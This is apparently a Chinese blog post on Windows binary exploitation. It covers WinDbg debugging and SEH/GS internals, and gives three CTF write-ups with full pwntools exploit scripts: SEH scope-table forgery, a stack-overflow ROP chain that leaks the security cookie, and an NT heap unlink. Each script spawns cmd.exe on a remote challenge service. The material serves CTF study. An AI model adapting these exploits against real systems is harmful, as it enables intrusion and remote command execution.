---
title: winpwn
date: 2020-12-24 12:10:46
tags:
---
# windows pwn初探

## 前言

这几天跟着xxrw和lyyl学到了不少winpwn的知识，整理一下

## 环境搭建

checksec工具：

[winchecksec](https://github.com/trailofbits/winchecksec)

[checksec](https://github.com/Wenzel/checksec.py)

调试工具：

[windbg](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools)

windbg previewer

[win_server](https://github.com/Ex-Origin/win_server)

## 调试

win_server监听某个程序，虚拟机中remote连接，raw_input()等待windbg attach之后再发送数据。

常用命令：

1. bp [exe_name]+offset:断在offset处
2. bp pe_base+offset:断在offset处
3. lm:查看加载的dll及pe地址空间
4. u addr:查看addr处的代码
5. g:运行到断点
6. p:单步步过
7. t:单步步入
8. !address [target_addr]:查看target_addr所属的地址范围
9. dps [addr]:查看addr处开始的一段范围内的值，并且搜索出二进制对应的符号
10.  s -d 0x0 l?0x7fffffff 0x12345678 全局搜索0x12345678
寻找gadget:

`ropper --file ./ntdll.dll --nocolor > gadget`

注意因为linux/win的汇编不同不可使用ROPGadget找gadget。

## 基础知识

1. GS:类似canary
2. ASLR:地址随机化，但是只有开机的时候才会随机一次

### windows异常处理机制

scopeTable结构体中保存了__try块相匹配的__except,__finally的值，在main函数开始的入口就被压入到栈中。

在遇到异常时，先执行except_handler4函数，该函数首先将scope_table的地址同security_cookie异或得到实际地址，之后验证gs的值，满足要求后当try_level=0xfffffffe(-2)时，调用scope_table中的filter_func。

## HitbGsec-babystack

### 程序逻辑 && 漏洞利用

通过checksec可以看到SafeSEH关闭，ASLR开启，有GS保护。

程序开始会leak出main_addr和stack_addr，根据前者可以得到pe_base，后面任意地址读可以借此得到security_cookie的值(或者先leak gs再用gs异或ebp)。

程序最后有个后门，a,b被初始化为1，当a+b=3时触发后门，由于溢出不到a,b，因此后门实际触发不到，我们通过伪造scope_table来实现。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax
  FILE *v4; // eax
  _DWORD *v5; // ST38_4
  int v6; // [esp+20h] [ebp-C0h]
  int v7; // [esp+24h] [ebp-BCh]
  signed int i; // [esp+2Ch] [ebp-B4h]
  char v9; // [esp+44h] [ebp-9Ch]
  CPPEH_RECORD ms_exc; // [esp+C8h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v3 = (FILE *)_acrt_iob_func(1);
  setvbuf(v3, 0, 4, 0);
  v4 = (FILE *)_acrt_iob_func(0);
  setvbuf(v4, 0, 4, 0);
  puts("ouch! Do not kill me , I will tell you everything");
  sub_401420("stack address = 0x%x\n", &v9);
  sub_401420("main address = 0x%x\n", main);
  for ( i = 0; i < 10; ++i )
  {
    puts("Do you want to know more?");
    get_input((int)&v9, 10);
    v7 = strcmp(&v9, "yes");
    if ( v7 )
      v7 = -(v7 < 0) | 1;
    if ( v7 )
    {
      v6 = strcmp(&v9, "no");
      if ( v6 )
        v6 = -(v6 < 0) | 1;
      if ( !v6 )
        break;
      get_input((int)&v9, 0x100);
    }
    else
    {
      puts("Where do you want to know");
      v5 = (_DWORD *)read_int();
      sub_401420("Address 0x%x value is 0x%x\n", v5, *v5);
    }
  }
  ms_exc.registration.TryLevel = -2;
  puts("I can tell you everything, but I never believe 1+1=2");
  puts("AAAA, you kill me just because I don't think 1+1=2??");
  exit(0);
}
```

观察一下函数入口处，push了try_level，其值为-2，然后push了seh_scope，`__except_handler4`异常处理指针，push了`fs:[0]`，也就是next指针，再往后push了ms_exc.exc_ptr和old_esp。

ipad画了个自己能看懂的图标记了一下。可以将它想象成把一个大的结构体push到了栈上。

![1](./1.png)

```
00000000 CPPEH_RECORD    struc ; (sizeof=0x18, align=0x4, copyof_9)
00000000                                         ; XREF: ___scrt_is_nonwritable_in_current_image/r
00000000                                         ; _main/r ...
00000000 old_esp         dd ?                    ; XREF: _main+36/w
00000000                                         ; _main:final_func/r ...
00000004 exc_ptr         dd ?                    ; XREF: __scrt_common_main_seh(void):$LN17/r
00000004                                         ; ___scrt_is_nonwritable_in_current_image:loc_4019DE/r ; offset
00000008 registration    _EH3_EXCEPTION_REGISTRATION ?
00000008                                         ; XREF: _main+21/w
00000008                                         ; _main+2D/o ...
00000018 CPPEH_RECORD    ends
//
00000000 _EH3_EXCEPTION_REGISTRATION struc ; (sizeof=0x10, align=0x4, copyof_6)
00000000                                         ; XREF: CPPEH_RECORD/r
00000000 Next            dd ?                    ; offset
00000004 ExceptionHandler dd ?                   ; offset
00000008 ScopeTable      dd ?                    ; XREF: _main+21/w ; offset
0000000C TryLevel        dd ?                    ; XREF: _main+57/w
0000000C                                         ; _main:loc_40133F/w ...
00000010 _EH3_EXCEPTION_REGISTRATION end
```

seh_scope的结构如下，伪造的时候前面照抄，后面将两个函数指针改成后门地址。最后触发0地址访问错误进行异常函数调用。

```
.rdata:00403688 init_seh_secope_table dd 0FFFFFFE4h           ; GSCookieOffset
.rdata:00403688                                         ; DATA XREF: _main+5↑o
.rdata:00403688                 dd 0                    ; GSCookieXOROffset
.rdata:00403688                 dd 0FFFFFF20h           ; EHCookieOffset
.rdata:00403688                 dd 0                    ; EHCookieXOROffset
.rdata:00403688                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
.rdata:00403688                 dd offset execpt_func   ; ScopeRecord.FilterFunc
.rdata:00403688                 dd offset final_func    ; ScopeRecord.HandlerFunc
```

```asm
xt:004010B0 ; __unwind { // __except_handler4
.text:004010B0                 push    ebp
.text:004010B1                 mov     ebp, esp
.text:004010B3                 push    0FFFFFFFEh
.text:004010B5                 push    offset init_seh_secope_table
.text:004010BA                 push    offset __except_handler4
.text:004010BF                 mov     eax, large fs:0
.text:004010C5                 push    eax
.text:004010C6                 add     esp, 0FFFFFF40h
.text:004010CC                 mov     eax, ___security_cookie
.text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax
.text:004010D4                 xor     eax, ebp
.text:004010D6                 mov     [ebp+var_1C], eax
.text:004010D9                 push    ebx
.text:004010DA                 push    esi
.text:004010DB                 push    edi
.text:004010DC                 push    eax
.text:004010DD                 lea     eax, [ebp+ms_exc.registration]
.text:004010E0                 mov     large fs:0, eax
.text:004010E6                 mov     [ebp+ms_exc.old_esp], esp
.text:004010E9                 mov     [ebp+var_B8], 0
.text:004010F3                 mov     [ebp+var_CC], 1
.text:004010FD                 mov     [ebp+var_D0], 1
.text:00401107 ;   __try { // __except at final_func
.text:00401107                 mov     [ebp+ms_exc.registration.TryLevel], 0
.text:0040110E                 push    0               ; Size
.text:00401110                 push    4               ; Mode
.text:00401112                 push    0               ; Buf
```

### exp.py

```py
# encoding=utf-8
from pwn import *

context.arch = "i386"
context.log_level = "debug"

p = remote('10.210.108.240', 10031)
#p = remote('node3.buuoj.cn', 28789)

raw_input()
#leak stack addr
p.recvuntil("stack address = 0x")
stack_addr = int(p.recvline().strip('\n'),16)
log.success("stack addr => " + hex(stack_addr))
#leak main addr
p.recvuntil("main address = 0x")
main_addr = int(p.recvline().strip('\n'),16)
pe_base = main_addr - 0x10b0
ebp = stack_addr+0x9c
log.success("main addr => " + hex(main_addr))
#leak gs
p.recvuntil("Do you want to know more?")
p.sendline("yes")
p.sendline(str(stack_addr+0x80))

p.recvuntil("value is 0x")
gs = int(p.recvline().strip('\n'),16)
log.success("gs => " + hex(gs))

security_cookie = gs ^ (stack_addr+0x9c)
log.success("security_cookie => " + hex(security_cookie))
#leak next
p.recvuntil("Do you want to know more?")
p.sendline("yes")
p.sendline(str(ebp-0x10))
p.recvuntil("value is 0x")
next_p = int(p.recvline().strip('\n'),16)
log.success("next => " + hex(next_p))
#fake scope
back_door = pe_base + 0x138d
except_handler = pe_base + 0x1460
'''
fake_scope = flat([
    0x0FFFFFFFE,
    0,
    0x0FFFFFFCC,
    0,
    0xFFFFFFFE,
    back_door
    ])
'''
fake_scope =flat([
    0x0FFFFFFE4,
    0,
    0x0FFFFFF20,
    0,
    0x0FFFFFFFE,
    back_door,
    back_door
    ])
payload = 'a'*0x10+fake_scope.ljust(0x9c-0x1c-0x10,'a')
payload += p32(gs)+'c'*0x8+flat([
    next_p,#ebp-0x10
    except_handler,
    (stack_addr+0x10) ^ security_cookie,
    0
    ])

p.recvuntil("Do you want to know more?")
p.sendline("noo")
p.sendline(payload)
p.recvuntil("Do you want to know more?")
p.sendline("yes")
p.recvuntil("Where do you want to know\r\n")
p.sendline("0")
p.interactive()
```

## qwb2020-easyoverflow

### 程序逻辑 && 漏洞利用

程序没有开CFG，有栈溢出，可以leak三次数据。

由于win的地址随机化的原因，我们先leak出pe_base/ntdll_base，然后leak gs，利用栈溢出的rop将security_cookie泄露出来进而异或得到rsp栈地址，注意此时pop rbx=1可以重复进行rop，再二次溢出根据read@iat得到ucrtdll_base，第三次溢出执行system("cmd.exe")。

win x64的前四个参数寄存器为rcx rdx r8 r9。

注意后面溢出的时候rsp值改变，相应的gs值也要修改为new_rsp ^ security_cookie。

```c
__int64 main_func()
{
  FILE *v0; // rax
  FILE *v1; // rax
  FILE *v2; // rax
  signed int v3; // ebx
  char Dst; // [rsp+20h] [rbp-118h]

  v0 = (FILE *)_acrt_iob_func(0i64);
  setbuf(v0, 0i64);
  v1 = (FILE *)_acrt_iob_func(1i64);
  setbuf(v1, 0i64);
  v2 = (FILE *)_acrt_iob_func(2i64);
  setbuf(v2, 0i64);
  v3 = 3;
  do
  {
    --v3;
    memset(&Dst, 0, 0x100ui64);
    puts("input:");
    read(0, &Dst, 0x400u);
    puts("buffer:");
    puts(&Dst);
  }
  while ( v3 > 0 );
  return 0i64;
}
```

### exp.py

```py
# encoding=utf-8
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = remote('10.210.108.240', 10030)


def leak(size):
    p.sendafter("input:\r\n", "a"*size)
    p.recvuntil("buffer:\r\n")
    p.recvuntil("a"*size)


# ntdll
p_rdx_rcx_r8_r9_r2 = 0x8B540
p_rbx = 0xF70BF

# pe file
puts_offset = 0x10a6
read_import = 0x2178
cookie_offset = 0x3008
ret_address = 0x10ca

# ucrtbase
system_address = 0xae5d0
cmd_address = 0xd0c00

raw_input()
leak(0x100)
gs_value = u64(p.recv(6).ljust(8, b"\x00"))
log.success("gs_value {}".format(hex(gs_value)))

# leak(0x118)
# pe_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x12f4
# log.success("pe base {}".format(hex(pe_base)))
#leak(0x118)
#pe_base = u64(p.recvn(6).ljust(8,'\x00')) - 0x12f4

#leak ntdll
pe_base = 0x7ff69f6e0000
log.success("pe base => " + hex(pe_base))
leak(0x188)
ntdll_base = u64(p.recvn(6).ljust(8,'\x00')) - 0x4cec1
#
ntdll_base = 0x7ffddc5d0000
log.success("ntdll base => " + hex(ntdll_base))
#leak s_cookie
payload = 'a'*0x100
payload += p64(gs_value)+p64(0)*2
payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(0)+p64(pe_base+cookie_offset)+p64(0)*4
payload += p64(ntdll_base+p_rbx)+p64(1)
payload += p64(pe_base+puts_offset)
p.recvuntil("input:\r\n")
p.send(payload)
p.recvuntil("a"*0x100)
p.recvline()
security_cookie = u64(p.recvn(6).ljust(8,'\x00'))
log.success("security cookie => " + hex(security_cookie))
old_rsp = security_cookie ^ gs_value
log.success("old rsp => " + hex(old_rsp))
new_rsp = old_rsp + 0x188
input_addr = new_rsp + 0x20
new_gs = new_rsp ^ security_cookie

log.success("new rsp => " + hex(new_rsp))
log.success("new gs => " + hex(new_gs))

payload = 'a'*0x100
payload += p64(new_gs)+p64(0)*2
payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(0)+p64(pe_base+read_import)+p64(0)*4
payload += p64(ntdll_base+p_rbx)+p64(1)
payload += p64(pe_base+puts_offset)
p.recvuntil("input:\r\n")

p.send(payload)
p.recvuntil("a"*0x100)
p.recvline()
ucrt = u64(p.recvn(6).ljust(8,'\x00'))
ucrt_base = ucrt - 0x17bc0
log.success("ucrt base => " + hex(ucrt_base))

new_rsp = new_rsp + 0x188
new_gs = new_rsp ^ security_cookie
payload = 'a'*0x100
payload += p64(new_gs)+p64(0)*2
payload += p64(ntdll_base+p_rdx_rcx_r8_r9_r2)+p64(0)+p64(ucrt_base+cmd_address)+p64(0)*4
payload += p64(ucrt_base+system_address)
p.recvuntil("input:\r\n")
p.send(payload)
p.interactive()

```

## SCTF2020-EasyWinHeap

### 程序逻辑 & 漏洞利用

堆菜单题，有溢出和UAF。bss上先分配了一大块堆地址用于存放chunks，先UAF+Show leak出heap_addr，进而unlink达到任意地址写的效果。

这里多提一下win的unlink，在AngelBoy的Slide里有提到win的unlink更加简单，因为flink和blink指向的是data_ptr，因此只需要伪造`fd = &p-8，bk= &p`即可。另外为了绕过检查我们需要先释放chunk1 chunk3，再编辑chunk1，这样是为了绕过list_head的检查。另外很有意思的是在后面的一个check失败的情况下程序也不会abort，而是阻止新chunk插入链表，详情可以看ppt。之后再释放chunk0即可触发unlink，地址任意写，将chunk_addr改成heap_addr来leak上面的pe_addr，最后在iat表泄露出urctbase，通过`s -a 0 L?80000000/2 "cmd.exe"`搜索cmd字符串，通过`u ucrtbase!system`查看system函数地址，最后任意地址写将函数指针改为system，布置cmd到堆上。

```c
int main_func()
{
  FILE *v0; // eax
  FILE *v1; // eax
  FILE *v2; // eax
  void (__cdecl *v3)(const char *); // edi
  unsigned int global_idx; // esi
  _DWORD *v5; // eax
  SIZE_T v6; // ST34_4
  LPVOID chunk_addr; // eax
  int v8; // ecx
  int v9; // ebx
  int v10; // esi
  int v11; // ecx
  int v12; // ebx
  char v13; // al
  int result; // eax
  int v15; // [esp+Ch] [ebp-1Ch]
  unsigned int v16; // [esp+10h] [ebp-18h]
  unsigned int idx1; // [esp+14h] [ebp-14h]
  unsigned int idx; // [esp+18h] [ebp-10h]
  unsigned int v19; // [esp+1Ch] [ebp-Ch]
  int choice; // [esp+20h] [ebp-8h]

  v0 = (FILE *)_acrt_iob_func(0);
  setvbuf(v0, 0, 4, 0);
  v1 = (FILE *)_acrt_iob_func(1);
  setvbuf(v1, 0, 4, 0);
  v2 = (FILE *)_acrt_iob_func(2);
  setvbuf(v2, 0, 4, 0);
  hHeap = HeapCreate(1u, 0x2000u, 0x2000u);
  v3 = (void (__cdecl *)(const char *))puts;
  dword_40338C = (int)HeapAlloc(hHeap, 9u, 0x80u);
  while ( 1 )
  {
    v3("/----------------------\\");
    v3("|   1: Alloc.          |");
    v3("|   2: Delete.         |");
    v3("|   3: Show.           |");
    v3("|   4: Edit.           |");
    v3("|   5: Exit.           |");
    v3("\\----------------------/");
    v3("option >");
    Scanf("%ud", &choice);
    getchar();
    switch ( choice )
    {
      case 1:
        global_idx = 0;
        v5 = (_DWORD *)(dword_40338C + 0xC);
        break;
      case 2:
        v3("index >");
        Scanf("%ud", &idx);
        getchar();
        if ( idx >= 0x10 || !*(_DWORD *)(dword_40338C + 8 * idx + 4) )
          goto LABEL_29;
        HeapFree(hHeap, 1u, *(LPVOID *)(dword_40338C + 8 * idx + 4));// UAF
        continue;
      case 3:
        v3("index >");
        Scanf("%ud", &idx1);
        getchar();
        if ( idx1 >= 0x10 || !*(_DWORD *)(dword_40338C + 8 * idx1 + 4) )
          goto LABEL_29;
        ((void (__cdecl *)(_DWORD))(*(_DWORD *)(dword_40338C + 8 * idx1) & 0xFFFFFFF0))(*(_DWORD *)(dword_40338C
                                                                                                  + 8 * idx1
                                                                                                  + 4));
        continue;
      case 4:
        v3("index >");
        Scanf("%ud", &v16);
        getchar();
        if ( v16 >= 0x10 )
          goto LABEL_29;
        v9 = 8 * v16;
        if ( !*(_DWORD *)(8 * v16 + dword_40338C + 4) )
          goto LABEL_29;
        v3("content  >");
        v10 = 0;
        v11 = *(_DWORD *)(v9 + dword_40338C);
        v12 = *(_DWORD *)(v9 + dword_40338C + 4);
        v15 = 16 * (v11 & 0xF);
        v13 = getchar();
        if ( v13 != 10 )
        {
          do
          {
            *(_BYTE *)(v10++ + v12) = v13;
            if ( v10 == v15 - 1 )
              break;
            v13 = getchar();
          }
          while ( v13 != 10 );
          v3 = (void (__cdecl *)(const char *))puts;
        }
        *(_BYTE *)(v10 + v12) = 0;
        continue;
      case 5:
        return 0;
      default:
        continue;
    }
    while ( 1 )
    {
      if ( !*(v5 - 2) )
        goto LABEL_14;
      if ( !*v5 )
        break;
      if ( !v5[2] )
      {
        global_idx += 2;
        goto LABEL_13;
      }
      if ( !v5[4] )
      {
        global_idx += 3;
        goto LABEL_13;
      }
      global_idx += 4;
      v5 += 8;
      if ( global_idx >= 0x10 )
        goto LABEL_13;
    }
    ++global_idx;
LABEL_13:
    if ( global_idx == 16 )
      break;
LABEL_14:
    v3("size >");
    Scanf("%ud", &v19);
    getchar();
    if ( v19 > 0x90 )
      break;
    v6 = (v19 >> 4) + 1;
    chunk_addr = HeapAlloc(hHeap, 1u, v6);
    v8 = dword_40338C;
    *(_DWORD *)(dword_40338C + 8 * global_idx) = (unsigned int)puts | v6;
    *(_DWORD *)(v8 + 8 * global_idx + 4) = chunk_addr;
  }
LABEL_29:
  v3("Error!");
  exit(-1);
  return result;
}
```

### exp.py

```py
# encoding=utf-8
from pwn import *

context.arch = "i386"
context.log_level = "debug"

p = remote('10.210.108.240', 10031)
#p = remote('node3.buuoj.cn', 28789)

def cmd(choice):
    p.sendlineafter("option >",str(choice))

def Alloc(sz):
    cmd(1)
    p.sendlineafter("size >",str(sz))

def Delete(idx):
    cmd(2)
    p.sendlineafter("index >",str(idx))

def Show(idx):
    cmd(3)
    p.sendlineafter("index >\r\n",str(idx))

def Edit(idx,content):
    cmd(4)
    p.sendlineafter("index >",str(idx))
    p.sendlineafter("content  >",content)

def exp():
    raw_input()
    #leak heap addr
    for i in range(6):
        Alloc(0x80)#0-5
    Delete(1)
    Delete(3)
    Show(1)
    heap_base = u32(p.recvn(4))
    log.success("heap base => " + hex(heap_base))
    bss_1 = heap_base-(0x5b0-0x4a4)
    Edit(1,p32(bss_1-4)+p32(bss_1))
    #unlink
    Delete(0)
    Edit(1,p32(bss_1-4))
    Show(1)
    pe_base = u32(p.recvn(3)+'\x00') - 0x1049
    log.success("pe base => " + hex(pe_base))
    #leak ucrtbase
    Edit(1,p32(pe_base+0x1049)+p32(pe_base+0x2054)+p32(pe_base+0x1049)+p32(bss_1-4))
    Show(1)
    ucrt_base = u32(p.recvn(4)) - (0x770c53e0-0x77080000)
    log.success("ucrt base => " + hex(ucrt_base))
    #
    system_addr = ucrt_base + (0x7716c730-0x77080000)
    #get shell
    Edit(2,p32(system_addr)+p32(bss_1+4)+"cmd.exe\x00")
    Show(1)
    p.interactive()

exp()
```

## 参考资料

非常感谢xxrw和lyyl两位大佬的指导 :)

[windbg的使用](https://www.lyyl.online/2019/10/09/windbg%E7%9A%84%E4%BD%BF%E7%94%A8/)

[WindowsPwn](https://blog.lyyl.online/2020/09/19/Windows-Pwn/)

[Heap-in-Windows](https://kirin-say.top/2020/01/01/Heap-in-Windows/)

[winpwn](https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/)

[Windows 10 Nt Heap Exploitation (Chinese version)](https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version)
